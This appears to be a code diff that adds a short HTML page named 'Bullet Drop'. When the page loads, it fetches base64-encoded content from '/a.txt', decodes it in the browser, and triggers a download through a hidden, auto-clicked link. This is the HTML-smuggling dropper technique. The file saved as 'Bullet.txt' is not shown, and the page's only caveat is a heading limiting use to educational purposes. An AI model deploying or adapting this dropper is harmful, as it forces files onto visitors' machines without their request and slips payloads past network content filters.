@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Bullet Drop</title>
+	</head>
+	<body>
+		<script>
+			filename = "Bullet.txt"
+			filedata = loadFile()
+			async function loadFile() {
+				try {
+					const response = await fetch('/a.txt');
+					const data = await response.text();
+					var filebytes = base64tobytes(data);
+					var blob = new Blob([filebytes], {"type":"octet/stream"});
+					var anchor = document.createElement("a");
+					document.body.append(anchor);
+					anchor.style = "display: none;";
+					var url = window.URL.createObjectURL(blob)
+					anchor.href = url;
+					anchor.download = filename;
+					anchor.click();
+					window.URL.revokeObjectURL(url);
+					} catch (err) {
+					console.error(err);
+				}
+			}
+			function base64tobytes(b64data){
+				var binary_values = atob(b64data);
+				var binary_length = binary_values.length
+				var bytes_data = new Uint8Array(binary_length);
+				for ( i = 0; i < binary_length; i++ ){
+					bytes_data[i] = binary_values.charCodeAt(i);
+				}
+				return bytes_data.buffer;
+			}
+		</script>
+		<h1>PLEASE USE IT ONLY FOR EDUCATIONAL PURPOSES.</h1>
+	</body>
+</html>
